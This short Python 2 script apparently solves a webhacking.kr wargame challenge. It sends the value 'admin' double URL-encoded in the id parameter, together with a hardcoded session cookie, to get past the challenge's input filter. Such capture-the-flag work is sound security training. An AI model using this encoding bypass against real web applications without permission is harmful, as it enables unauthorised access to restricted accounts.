#-*- coding: utf-8 -*-
import urllib2
import CookieManager

challengeUrl = "http://webhacking.kr/challenge/web/web-11/"
CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")

parameter = "%2561%2564%256d%2569%256e"
httpRequest = urllib2.Request(challengeUrl + "?id=" + parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
